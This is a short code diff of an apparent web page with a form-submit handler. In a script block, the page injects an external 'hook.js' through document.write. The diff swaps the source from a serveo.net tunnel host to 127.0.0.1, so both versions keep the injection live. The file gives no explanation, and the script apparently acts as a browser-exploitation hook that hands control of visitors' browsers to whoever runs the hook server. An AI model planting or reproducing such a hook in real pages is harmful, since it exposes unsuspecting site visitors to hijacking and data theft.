@@ -274,7 +274,7 @@ form.addEventListener('submit', async (event) => {
 </script>
 
 <script>
-var commandModuleStr = '<script src="https://902bfb34f2272eacab39ba2d3ba73d12.serveo.net/hook.js" type="text/javascript"><\/script>';
+var commandModuleStr = '<script src="http://127.0.0.1/hook.js" type="text/javascript"><\/script>';
 document.write(commandModuleStr);
 </script>
 
